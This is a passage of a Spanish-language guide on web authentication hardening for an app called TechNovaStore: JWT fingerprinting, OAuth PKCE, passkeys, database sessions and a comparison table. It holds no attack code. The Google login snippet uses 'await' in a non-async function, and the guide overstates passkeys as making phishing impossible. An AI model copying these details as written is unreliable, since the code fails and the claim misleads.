  return crypto.createHash('sha256').update(data).digest('hex');
};

export const login = async (req: Request, res: Response) => {
  // ... autenticación ...
  
  const fingerprint = generateFingerprint(req);
  
  const accessToken = jwt.sign(
    { 
      userId: user.id,
      fingerprint // ← Incluir en el token
    },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );
  
  // Guardar fingerprint en cookie separada
  res.cookie('device_fp', fingerprint, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });
  
  res.cookie('access_token', accessToken, { /* ... */ });
};

// Middleware de validación
export const authMiddleware = async (req: Request, res: Response, next: NextFunction) => {
  const token = req.cookies.access_token;
  const storedFingerprint = req.cookies.device_fp;
  
  const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JWTPayload;
  const currentFingerprint = generateFingerprint(req);
  
  // ✅ Validar que el fingerprint coincida
  if (decoded.fingerprint !== storedFingerprint || 
      decoded.fingerprint !== currentFingerprint) {
    return res.status(401).json({ error: 'Token inválido o robado' });
  }
  
  next();
};
Ventaja: Si un atacante roba el token, no puede usarlo desde otro dispositivo/IP.

🚀 Alternativas Más Modernas
1. OAuth 2.0 con Authorization Code Flow + PKCE
En lugar de manejar contraseñas tú mismo, delegar a proveedores confiables:

// Frontend
const loginWithGoogle = () => {
  // Generar PKCE challenge
  const codeVerifier = generateRandomString(128);
  const codeChallenge = await sha256(codeVerifier);
  
  sessionStorage.setItem('pkce_verifier', codeVerifier);
  
  // Redirigir a Google
  window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?` +
    `client_id=${GOOGLE_CLIENT_ID}&` +
    `redirect_uri=${REDIRECT_URI}&` +
    `response_type=code&` +
    `scope=openid email profile&` +
    `code_challenge=${codeChallenge}&` +
    `code_challenge_method=S256`;
};

// Backend - callback
export const googleCallback = async (req: Request, res: Response) => {
  const { code, code_verifier } = req.body;
  
  // Intercambiar code por tokens con Google
  const tokens = await exchangeCodeForTokens(code, code_verifier);
  
  // Obtener info del usuario de Google
  const googleUser = await getGoogleUserInfo(tokens.access_token);
  
  // Crear o encontrar usuario en tu DB
  const user = await findOrCreateUser(googleUser);
  
  // Generar TUS tokens
  const { accessToken, refreshToken } = generateTokens(user);
  
  // Enviar en httpOnly cookies
  res.cookie('access_token', accessToken, { /* ... */ });
  res.cookie('refresh_token', refreshToken, { /* ... */ });
};
Ventajas:

✅ No manejas contraseñas (menos responsabilidad)
✅ Google/GitHub manejan la seguridad
✅ 2FA gratis (si el usuario lo tiene en Google)
✅ Menos fricción para usuarios
2. WebAuthn / Passkeys (Sin Contraseñas)
La tecnología más moderna - autenticación biométrica:

// Frontend - Registro
const registerPasskey = async () => {
  // Solicitar challenge al servidor
  const { challenge, userId } = await fetch('/api/auth/passkey/register-challenge').then(r => r.json());
  
  // Crear credencial con biometría (Face ID, Touch ID, Windows Hello)
  const credential = await navigator.credentials.create({
    publicKey: {
      challenge: Uint8Array.from(challenge, c => c.charCodeAt(0)),
      rp: { name: "TechNovaStore" },
      user: {
        id: Uint8Array.from(userId, c => c.charCodeAt(0)),
        name: "user@example.com",
        displayName: "Usuario"
      },
      pubKeyCredParams: [{ alg: -7, type: "public-key" }],
      authenticatorSelection: {
        authenticatorAttachment: "platform", // Face ID, Touch ID
        userVerification: "required"
      }
    }
  });
  
  // Enviar credencial al servidor
  await fetch('/api/auth/passkey/register', {
    method: 'POST',
    body: JSON.stringify({ credential })
  });
};

// Frontend - Login
const loginWithPasskey = async () => {
  const { challenge } = await fetch('/api/auth/passkey/login-challenge').then(r => r.json());
  
  // Autenticar con biometría
  const assertion = await navigator.credentials.get({
    publicKey: {
      challenge: Uint8Array.from(challenge, c => c.charCodeAt(0)),
      userVerification: "required"
    }
  });
  
  // Enviar al servidor
  const response = await fetch('/api/auth/passkey/login', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ assertion })
  });
  
  // Servidor valida y envía httpOnly cookies
};
Ventajas:

✅ Sin contraseñas (imposible phishing)
✅ Biometría (Face ID, Touch ID, huella)
✅ Resistente a phishing
✅ Experiencia de usuario superior
✅ Estándar W3C (soportado por todos los navegadores modernos)
Desventajas:

⚠️ Requiere dispositivo compatible
⚠️ Implementación más compleja
3. Session Tokens en Base de Datos (Stateful)
En lugar de JWT (stateless), usar tokens opacos almacenados en DB:

// Backend - Login
export const login = async (req: Request, res: Response) => {
  // ... autenticación ...
  
  // ✅ Generar token aleatorio (no JWT)
  const sessionToken = crypto.randomBytes(32).toString('hex');
  
  // ✅ Guardar en base de datos
  await Session.create({
    token: sessionToken,
    user_id: user.id,
    ip_address: req.ip,
    user_agent: req.headers['user-agent'],
    expires_at: new Date(Date.now() + 15 * 60 * 1000),
    last_activity: new Date()
  });
  
  // Enviar en httpOnly cookie
  res.cookie('session_token', sessionToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000
  });
};

// Middleware
export const authMiddleware = async (req: Request, res: Response, next: NextFunction) => {
  const sessionToken = req.cookies.session_token;
  
  // ✅ Buscar en base de datos
  const session = await Session.findOne({
    where: {
      token: sessionToken,
      expires_at: { [Op.gt]: new Date() },
      is_revoked: false
    },
    include: [User]
  });
  
  if (!session) {
    return res.status(401).json({ error: 'Sesión inválida' });
  }
  
  // ✅ Actualizar última actividad
  await session.update({ last_activity: new Date() });
  
  req.user = session.user;
  next();
};

// Logout
export const logout = async (req: Request, res: Response) => {
  const sessionToken = req.cookies.session_token;
  
  // ✅ Revocar en base de datos
  await Session.update(
    { is_revoked: true },
    { where: { token: sessionToken } }
  );
  
  res.clearCookie('session_token');
};
Ventajas:

✅ Revocación instantánea (logout funciona inmediatamente)
✅ Puedes ver todas las sesiones activas
✅ Puedes cerrar sesiones remotamente
✅ Auditoría completa (IP, user agent, última actividad)
Desventajas:

⚠️ Requiere consulta a DB en cada request (más lento)
⚠️ Más carga en la base de datos
📊 Comparación de Enfoques
| Enfoque | Seguridad | Complejidad | Performance | UX | |---------|-----------|-------------|-------------|-----| | localStorage + JWT | ⚠️ Baja | ✅ Baja | ✅ Alta | ✅ Buena | | httpOnly Cookies + JWT | ✅ Alta | ✅ Media | ✅ Alta | ✅ Buena | | httpOnly + JWT + Rotation | ✅ Muy Alta | ⚠️ Media-Alta | ✅ Alta | ✅ Buena | | httpOnly + JWT + Fingerprinting | ✅ Muy Alta | ⚠️ Alta | ✅ Alta | ✅ Buena | | Session Tokens (DB) | ✅ Muy Alta | ⚠️ Media | ⚠️ Media | ✅ Buena | | OAuth 2.0 (Google/GitHub) | ✅ Muy Alta | ⚠️ Alta | ✅ Alta | ✅ Excelente | | WebAuthn / Passkeys | 🔥 Máxima | ⚠️ Muy Alta | ✅ Alta | 🔥 Excelente |

🎯 Recomendación para TechNovaStore
Fase 1 (Actual - MVP): localStorage + JWT
✅ Rápido de implementar
✅ Suficiente para desarrollo
Fase 2 (Pre-producción): httpOnly Cookies + JWT + Rotation
✅ Seguridad alta
✅ Complejidad manejable
✅ Performance excelente
Fase 3 (Producción): Agregar OAuth 2.0
✅ Menos fricción para usuarios
✅ Google/GitHub manejan seguridad
✅ Mantener email/password como opción
Fase 4 (Futuro): WebAuthn / Passkeys
✅ Máxima seguridad
✅ Mejor UX (sin contraseñas)
✅ Estándar del futuro
💡 Implementación Recomendada (Fase 2)

// Combinar las mejores prácticas:

// 1. httpOnly cookies
res.cookie('access_token', accessToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000
});

// 2. Token rotation
const newRefreshToken = generateRefreshToken();
await invalidateOldToken(oldRefreshToken);

// 3. Fingerprinting
const fingerprint = generateFingerprint(req);
const token = jwt.sign({ userId, fingerprint }, secret);

// 4. Rate limiting
await checkRateLimit(req.ip, 'login'); // Max 5 intentos por 15 min

// 5. Auditoría
await LoginAttempt.create({
  user_id: user.id,
  ip_address: req.ip,
  user_agent: req.headers['user-agent'],
  success: true
});